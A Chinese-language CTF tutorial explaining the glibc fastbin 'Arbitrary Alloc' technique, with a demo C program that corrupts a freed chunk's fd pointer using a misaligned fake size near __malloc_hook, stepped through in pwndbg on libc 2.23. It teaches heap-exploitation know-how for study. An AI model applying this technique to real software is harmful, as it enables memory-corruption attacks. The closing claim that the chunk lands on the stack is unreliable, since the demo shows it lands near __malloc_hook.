> 参考资料：
>
> [https://wiki.x10sec.org/pwn/heap/fastbin_attack/#arbitrary-alloc](https://wiki.x10sec.org/pwn/heap/fastbin_attack/#arbitrary-alloc)
>
> 附件：
>
> 链接: [https://pan.baidu.com/s/18qfkOMauvySSfHkSLjIvvQ](https://pan.baidu.com/s/18qfkOMauvySSfHkSLjIvvQ)  密码: 911k
>
> --来自百度网盘超级会员V3的分享
>

# 回顾及介绍
在上一小节中我们说过，要利用Alloc to Stack这个条件，对应的堆的地址必须要有合法的size，这样才能将堆内存分配到栈中，从而控制栈中的任意内存地址。而这个Arbitrary Alloc和Alloc to Stack基本上完全相同，但是控制的内存地址不在仅仅局限于栈，而是任意的内存地址，比如说bss、heap、data、stack等等。

# 例子
## 准备工作
在这个例子中，我们使用字节错位的方法来实现直接分配fastbin到_malloc_hook的位置，相当于覆盖_malloc_hook来控制程序的流程。

先来看一下Linux环境：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604395124123-0c716bbd-66e7-4e4a-94ac-dd1a30ea46db.png)

> main_arena_offset：[https://github.com/bash-c/main_arena_offset](https://github.com/bash-c/main_arena_offset)
>

从上面可以看到，我的Linux的版本为Ubuntu 16.04，libc版本为2.23。

代码如下：

```c
#include<stdio.h>
int main(void){
    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```

> 使用命令：gcc -g -z execstack -fno-stack-protector arbitrary_alloc.c -o arbitrary_alloc_elf进行编译
>

编译完成之后检查一下文件的保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604395385844-62e5b523-3dd8-41d0-b68c-0711d527fa03.png)

> 代码中的“0x7ffff7dd1af5-0x8”如果使用不当的话会造成程序崩溃，因此，如果你的Linux版本和我的不相同，请先编译这个程序，然后通过调试在__malloc_hook地址附近通过字节错位的方法找到合法的size。
>
> <font style="background-color:transparent;">此程序在我的本机上调试运行正常，如下图所示：</font>
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604395981944-804f9490-7b5b-44f1-b28a-0f6f6572d32f.png)

## 开始调试
#### 定义两个void指针
对程序第6行下断点，开始运行程序：

```c
ubuntu@ubuntu:~/Desktop$ gdb arbitrary_alloc_elf 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from arbitrary_alloc_elf...done.
pwndbg> l
warning: Source file is more recent than executable.
1	#include<stdio.h>
2	int main(void){
3	    void *chunk1;
4	    void *chunk_a;
5	
6	    chunk1=malloc(0x60);
7	
8	    free(chunk1);
9	
10	    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
pwndbg> b 6
Breakpoint 1 at 0x40056e: file arbitrary_alloc.c, line 6.
pwndbg> r
Starting program: /home/ubuntu/Desktop/arbitrary_alloc_elf 

Breakpoint 1, main () at arbitrary_alloc.c:6
6	    chunk1=malloc(0x60);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
 RAX  0x400566 (main) ◂— push   rbp
 RBX  0x0
 RCX  0x0
 RDX  0x7fffffffdeb8 —▸ 0x7fffffffe25f ◂— 'XDG_VTNR=7'
 RDI  0x1
 RSI  0x7fffffffdea8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/arbitrary_alloc_elf'
 R8   0x400630 (__libc_csu_fini) ◂— ret    
 R9   0x7ffff7de7af0 (_dl_fini) ◂— push   rbp
 R10  0x846
 R11  0x7ffff7a2d750 (__libc_start_main) ◂— push   r14
 R12  0x400470 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
 RIP  0x40056e (main+8) ◂— mov    edi, 0x60
─────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
 ► 0x40056e <main+8>     mov    edi, 0x60
   0x400573 <main+13>    call   malloc@plt <malloc@plt>
 
   0x400578 <main+18>    mov    qword ptr [rbp - 8], rax
   0x40057c <main+22>    mov    rax, qword ptr [rbp - 8]
   0x400580 <main+26>    mov    rdi, rax
   0x400583 <main+29>    call   free@plt <free@plt>
 
   0x400588 <main+34>    mov    rax, qword ptr [rbp - 8]
   0x40058c <main+38>    movabs rdx, _IO_wide_data_0+301 <0x7ffff7dd1aed>
   0x400596 <main+48>    mov    qword ptr [rax], rdx
   0x400599 <main+51>    mov    edi, 0x60
   0x40059e <main+56>    call   malloc@plt <malloc@plt>
─────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────
In file: /home/ubuntu/Desktop/arbitrary_alloc.c
    1 #include<stdio.h>
    2 int main(void){
    3     void *chunk1;
    4     void *chunk_a;
    5 
 ►  6     chunk1=malloc(0x60);
    7 
    8     free(chunk1);
    9 
   10     *(long long *)chunk1=0x7ffff7dd1af5-0x8;
   11     malloc(0x60);
─────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
01:0008│      0x7fffffffddb8 ◂— 0x0
02:0010│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
04:0020│      0x7fffffffddd0 ◂— 0x1
05:0028│      0x7fffffffddd8 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/arbitrary_alloc_elf'
06:0030│      0x7fffffffdde0 ◂— 0x1f7ffcca0
07:0038│      0x7fffffffdde8 —▸ 0x400566 (main) ◂— push   rbp
───────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► f 0           40056e main+8
   f 1     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

来看一下下面这张图片：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604396421356-b008e6f7-108a-4d26-9a4e-204e0a1a30d9.png)

此时chunk_a指针所指向的地址为0x7fffffffdea0

#### 执行chunk1=malloc(0x60);
对程序的第8行下断点，继续运行程序

```c
pwndbg> b 8
Breakpoint 2 at 0x40057c: file arbitrary_alloc.c, line 8.
pwndbg> c
Continuing.

Breakpoint 2, main () at arbitrary_alloc.c:8
8	    free(chunk1);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x602010 ◂— 0x0
 RBX  0x0
*RCX  0x7ffff7dd1b20 (main_arena) ◂— add    byte ptr [rax], al /* 0x100000000 */
*RDX  0x602010 ◂— 0x0
*RDI  0x7ffff7dd1b20 (main_arena) ◂— add    byte ptr [rax], al /* 0x100000000 */
*RSI  0x602070 ◂— 0x0
*R8   0x602000 ◂— 0x0
*R9   0xd
*R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602070 ◂— 0x0
*R11  0x0
 R12  0x400470 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
*RIP  0x40057c (main+22) ◂— mov    rax, qword ptr [rbp - 8]
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
   0x40056e <main+8>     mov    edi, 0x60
   0x400573 <main+13>    call   malloc@plt <malloc@plt>
 
   0x400578 <main+18>    mov    qword ptr [rbp - 8], rax
 ► 0x40057c <main+22>    mov    rax, qword ptr [rbp - 8]
   0x400580 <main+26>    mov    rdi, rax
   0x400583 <main+29>    call   free@plt <free@plt>
 
   0x400588 <main+34>    mov    rax, qword ptr [rbp - 8]
   0x40058c <main+38>    movabs rdx, _IO_wide_data_0+301 <0x7ffff7dd1aed>
   0x400596 <main+48>    mov    qword ptr [rax], rdx
   0x400599 <main+51>    mov    edi, 0x60
   0x40059e <main+56>    call   malloc@plt <malloc@plt>
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/arbitrary_alloc.c
    3     void *chunk1;
    4     void *chunk_a;
    5 
    6     chunk1=malloc(0x60);
    7 
 ►  8     free(chunk1);
    9 
   10     *(long long *)chunk1=0x7ffff7dd1af5-0x8;
   11     malloc(0x60);
   12     chunk_a=malloc(0x60);
   13     return 0;
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
01:0008│      0x7fffffffddb8 —▸ 0x602010 ◂— 0x0
02:0010│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
04:0020│      0x7fffffffddd0 ◂— 0x1
05:0028│      0x7fffffffddd8 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/arbitrary_alloc_elf'
06:0030│      0x7fffffffdde0 ◂— 0x1f7ffcca0
07:0038│      0x7fffffffdde8 —▸ 0x400566 (main) ◂— push   rbp
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           40057c main+22
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

堆与本地变量的信息如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604397058361-12900725-4200-498a-802f-7d87bc03b976.png)

可以看到，申请堆空间的data地址已经赋值给了chunk1指针。

#### 执行free(chunk1);
继续向下调试，对代码的第10行下断点，然后运行程序：

```c
pwndbg> b 10
Breakpoint 3 at 0x400588: file arbitrary_alloc.c, line 10.
pwndbg> c
Continuing.

Breakpoint 3, main () at arbitrary_alloc.c:10
10	    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
*RAX  0x0
 RBX  0x0
*RCX  0x7ffff7dd1b00 (__memalign_hook) —▸ 0x7ffff7a92ea0 (memalign_hook_ini) ◂— push   r12
*RDX  0x0
*RDI  0xffffffff
*RSI  0x7ffff7dd1b50 (main_arena+48) —▸ 0x602000 ◂— 0x0
*R8   0x602010 ◂— 0x0
*R9   0x0
*R10  0x8b8
*R11  0x7ffff7a91540 (free) ◂— push   r13
 R12  0x400470 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
*RIP  0x400588 (main+34) ◂— mov    rax, qword ptr [rbp - 8]
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
   0x400573 <main+13>    call   malloc@plt <malloc@plt>
 
   0x400578 <main+18>    mov    qword ptr [rbp - 8], rax
   0x40057c <main+22>    mov    rax, qword ptr [rbp - 8]
   0x400580 <main+26>    mov    rdi, rax
   0x400583 <main+29>    call   free@plt <free@plt>
 
 ► 0x400588 <main+34>    mov    rax, qword ptr [rbp - 8]
   0x40058c <main+38>    movabs rdx, _IO_wide_data_0+301 <0x7ffff7dd1aed>
   0x400596 <main+48>    mov    qword ptr [rax], rdx
   0x400599 <main+51>    mov    edi, 0x60
   0x40059e <main+56>    call   malloc@plt <malloc@plt>
 
   0x4005a3 <main+61>    mov    edi, 0x60
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/arbitrary_alloc.c
    5 
    6     chunk1=malloc(0x60);
    7 
    8     free(chunk1);
    9 
 ► 10     *(long long *)chunk1=0x7ffff7dd1af5-0x8;
   11     malloc(0x60);
   12     chunk_a=malloc(0x60);
   13     return 0;
   14 }
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
01:0008│      0x7fffffffddb8 —▸ 0x602010 ◂— 0x0
02:0010│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
04:0020│      0x7fffffffddd0 ◂— 0x1
05:0028│      0x7fffffffddd8 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/arbitrary_alloc_elf'
06:0030│      0x7fffffffdde0 ◂— 0x1f7ffcca0
07:0038│      0x7fffffffdde8 —▸ 0x400566 (main) ◂— push   rbp
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           400588 main+34
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

此时的fastbin已经回收堆内存：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604401326177-ba8ec5fe-bd41-401a-a3f2-b5c05695fa96.png)![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604401378013-8cca1e36-d629-4966-8e43-ed1aff1e2ace.png)

在说明下一行代码之前，先来说说代码错位这个情况。由于这个程序的本意是控制__malloc_hook，所以我们先找到它的地址，如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604401556355-9f85e370-3725-4ca7-b2f9-4440cccdd899.png)

要控制__malloc_hook地址，就要先找到合法的size域，在地址0x7ffff7dd1b10开始向前寻找：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604401818994-10d619c6-67ae-4675-845e-9a1256735fdb.png)

---

> 错误示范：
>
> ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604401869952-b5c9937d-1a97-484e-bf33-fc6bc97fd4fd.png)
>

---

由于这个程序是64位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：

```c
//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10] 
Fastbins[idx=1, size=0x20] 
Fastbins[idx=2, size=0x30] 
Fastbins[idx=3, size=0x40] 
Fastbins[idx=4, size=0x50] 
Fastbins[idx=5, size=0x60] 
Fastbins[idx=6, size=0x70] 
```

通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604403717387-e9afb4d0-c792-48a9-b4fa-9404e541e04f.png)

因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。

```c
##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```

> （注意sz的大小是unsigned int，因此只占4个字节）
>

而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 malloc_hook的内容(在我的libc中realloc_hook与__malloc_hook是在连在一起的)。

#### ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604404046017-376ee4df-a5bf-4bad-b323-55b498eaf391.png)
#### 执行 *(long long *)chunk1=0x7ffff7dd1af5-0x8;
对代码的第11行下断点，继续运行程序：

```c
pwndbg> b 11
Breakpoint 4 at 0x400599: file arbitrary_alloc.c, line 11.
pwndbg> c
Continuing.

Breakpoint 4, main () at arbitrary_alloc.c:11
11	    malloc(0x60);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
*RAX  0x602010 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7dd0260000000
 RBX  0x0
 RCX  0x7ffff7dd1b00 (__memalign_hook) —▸ 0x7ffff7a92ea0 (memalign_hook_ini) ◂— push   r12
*RDX  0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7dd0260000000
 RDI  0xffffffff
 RSI  0x7ffff7dd1b50 (main_arena+48) —▸ 0x602000 ◂— 0x0
 R8   0x602010 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7dd0260000000
 R9   0x0
 R10  0x8b8
 R11  0x7ffff7a91540 (free) ◂— push   r13
 R12  0x400470 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
*RIP  0x400599 (main+51) ◂— mov    edi, 0x60
─────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
   0x400580 <main+26>    mov    rdi, rax
   0x400583 <main+29>    call   free@plt <free@plt>
 
   0x400588 <main+34>    mov    rax, qword ptr [rbp - 8]
   0x40058c <main+38>    movabs rdx, _IO_wide_data_0+301 <0x7ffff7dd1aed>
   0x400596 <main+48>    mov    qword ptr [rax], rdx
 ► 0x400599 <main+51>    mov    edi, 0x60
   0x40059e <main+56>    call   malloc@plt <malloc@plt>
 
   0x4005a3 <main+61>    mov    edi, 0x60
   0x4005a8 <main+66>    call   malloc@plt <malloc@plt>
 
   0x4005ad <main+71>    mov    qword ptr [rbp - 0x10], rax
   0x4005b1 <main+75>    mov    eax, 0
─────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────
In file: /home/ubuntu/Desktop/arbitrary_alloc.c
    6     chunk1=malloc(0x60);
    7 
    8     free(chunk1);
    9 
   10     *(long long *)chunk1=0x7ffff7dd1af5-0x8;
 ► 11     malloc(0x60);
   12     chunk_a=malloc(0x60);
   13     return 0;
   14 }
─────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb0 —▸ 0x7fffffffdea0 ◂— 0x1
01:0008│      0x7fffffffddb8 —▸ 0x602010 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7dd0260000000
02:0010│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
04:0020│      0x7fffffffddd0 ◂— 0x1
05:0028│      0x7fffffffddd8 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/arbitrary_alloc_elf'
06:0030│      0x7fffffffdde0 ◂— 0x1f7ffcca0
07:0038│      0x7fffffffdde8 —▸ 0x400566 (main) ◂— push   rbp
───────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► f 0           400599 main+51
   f 1     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

0x7ffff7dd1af5-0x8=0x7ffff7dd1aed

这条语句执行完成之后，来看一下堆内存

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604404510025-63025d33-e310-4be7-a2f4-2b375756477f.png)

赋值之后，我们来看一下此时的bin

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604404800443-3683c2bd-d08a-42af-93cc-ccb351c70ef1.png)

从这个bin可以看出，假如我们进行两次malloc的话：

第一次malloc使用空间0x602000

第二次malloc使用空间0x0x7ffff7dd1aed

为了验证这个猜想，我们对代码的13行下断点，然后运行程序

#### 执行两个malloc
```c
pwndbg> b 13
Breakpoint 5 at 0x4005b1: file arbitrary_alloc.c, line 13.
pwndbg> c
Continuing.

Breakpoint 5, main () at arbitrary_alloc.c:13
13	    return 0;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS ]────────────────────────────────────────
*RAX  0x7ffff7dd1afd ◂— 0xfff7a92ea0000000
 RBX  0x0
*RCX  0x7ffff7dd1afd ◂— 0xfff7a92ea0000000
*RDX  0x7ffff7dd1afd ◂— 0xfff7a92ea0000000
*RDI  0x5
*RSI  0x7ffff7dd1b48 (main_arena+40) ◂— 0
*R8   0xfff7a92ea0000000
 R9   0x0
 R10  0x8b8
 R11  0x7ffff7a91540 (free) ◂— push   r13
 R12  0x400470 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdea0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffddb0 —▸ 0x7ffff7dd1afd ◂— 0xfff7a92ea0000000
*RIP  0x4005b1 (main+75) ◂— mov    eax, 0
─────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
   0x400599       <main+51>                  mov    edi, 0x60
   0x40059e       <main+56>                  call   malloc@plt <malloc@plt>
 
   0x4005a3       <main+61>                  mov    edi, 0x60
   0x4005a8       <main+66>                  call   malloc@plt <malloc@plt>
 
   0x4005ad       <main+71>                  mov    qword ptr [rbp - 0x10], rax
 ► 0x4005b1       <main+75>                  mov    eax, 0
   0x4005b6       <main+80>                  leave  
   0x4005b7       <main+81>                  ret    
    ↓
   0x7ffff7a2d840 <__libc_start_main+240>    mov    edi, eax
   0x7ffff7a2d842 <__libc_start_main+242>    call   exit <exit>
 
   0x7ffff7a2d847 <__libc_start_main+247>    xor    edx, edx
─────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────
In file: /home/ubuntu/Desktop/arbitrary_alloc.c
    8     free(chunk1);
    9 
   10     *(long long *)chunk1=0x7ffff7dd1af5-0x8;
   11     malloc(0x60);
   12     chunk_a=malloc(0x60);
 ► 13     return 0;
   14 }
─────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ rsp  0x7fffffffddb0 —▸ 0x7ffff7dd1afd ◂— 0xfff7a92ea0000000
01:0008│      0x7fffffffddb8 —▸ 0x602010 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7dd0260000000
02:0010│ rbp  0x7fffffffddc0 —▸ 0x4005c0 (__libc_csu_init) ◂— push   r15
03:0018│      0x7fffffffddc8 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
04:0020│      0x7fffffffddd0 ◂— 0x1
05:0028│      0x7fffffffddd8 —▸ 0x7fffffffdea8 —▸ 0x7fffffffe236 ◂— '/home/ubuntu/Desktop/arbitrary_alloc_elf'
06:0030│      0x7fffffffdde0 ◂— 0x1f7ffcca0
07:0038│      0x7fffffffdde8 —▸ 0x400566 (main) ◂— push   rbp
───────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► f 0           4005b1 main+75
   f 1     7ffff7a2d840 __libc_start_main+240
────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604414022838-12a77e3c-e30e-4c57-bc33-09566d76e88b.png)

可以看到，此时堆内存已经分配到了栈上，并且可以继续向下延伸控制栈空间。

## 小总结
Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。



